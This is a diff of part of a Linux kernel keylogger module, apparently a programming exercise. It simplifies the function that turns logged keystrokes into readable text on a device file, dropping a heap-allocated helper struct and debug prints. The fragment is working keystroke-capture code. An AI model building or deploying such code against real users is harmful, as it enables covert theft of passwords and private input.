@@ -210,47 +210,32 @@ static struct miscdevice		dev = {
 
 /* ****************************** BONUS DEVICE ****************************** */
 
-struct bonus_pack {
-	struct seq_file		*seq;
-	struct file		*file;
-};
-
 static void		bonus_iterate(struct key_log_entry *log, void *ptr)
 {
-	struct bonus_pack	*pack = ptr;
+	struct seq_file		*seq = ptr;
 	char			ascii;
 
-	pr_info("iter: %p\n", pack);
 	ascii = (log->upper_case) ? log->key->ascii_up : log->key->ascii;
 	if (ascii == '\b') {
-		seq_lseek(pack->file, -1, SEEK_CUR);
+		if (seq->count > 0)
+			seq->count -= 1;
 	} else if (isprint(ascii) || ascii == '\n')
-		seq_putc(pack->seq, ascii);
+		seq_putc(seq, ascii);
 }
 
 static int		bonus_show(struct seq_file *seq, void *ptr)
 {
-	struct bonus_pack	*pack = ptr;
-
-	pack->seq = seq;
-	pack->file = ptr;
-	pr_info("show: %p\n", &pack);
-	key_log_iter(bonus_iterate, pack);
-	kfree(pack);
+	key_log_iter(bonus_iterate, ptr);
 	return 0;
 }
 
 static int		bonus_open(struct inode *node, struct file *file)
 {
 	int			ret;
-	struct bonus_pack	*pack;
 
-	pack = kmalloc(sizeof(struct bonus_pack), GFP_KERNEL);
-	if (!pack)
-		return -ENOMEM;
+	file->private_data = NULL;
 	spin_lock(&slock);
-	pr_info("open: %p - %p\n", file, pack);
-	ret = single_open(file, bonus_show, pack);
+	ret = single_open(file, bonus_show, NULL);
 	spin_unlock(&slock);
 	return ret;
 }
